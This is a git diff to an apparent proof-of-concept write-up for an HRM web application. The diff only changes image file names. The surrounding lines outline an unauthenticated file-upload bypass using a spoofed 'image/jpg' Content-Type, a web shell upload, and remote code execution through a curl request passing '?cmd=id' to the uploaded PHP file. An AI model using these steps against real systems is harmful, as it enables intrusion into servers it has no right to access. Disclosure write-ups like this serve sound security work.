@@ -14,7 +14,7 @@ Proof of Concept:
 
 Bypass check type using `Content-Type: image/jpg` in the upload form.
 
-![](Pasted%20image%2020221202002946.png)
+![](images/bypass-restriction.png)
 
 ### 2. Upload web shell without authentication
 
@@ -55,7 +55,7 @@ Content-Disposition: form-data; name="imagefilename"
 -----------------------------33759207513109230905790184197--
 ```
 
-![](Pasted%20image%2020221202002229.png)
+![](images/sent-payload.png)
 
 ### 3. Find the uploaded web shell file and get RCE
 
@@ -71,4 +71,4 @@ Get remote code execution
 curl localhost/hrm/image/247245leecybersec.php?cmd=id
 ```
 
-![](Pasted%20image%2020221202002641.png)
+![](images/find-webshell-rce.png)
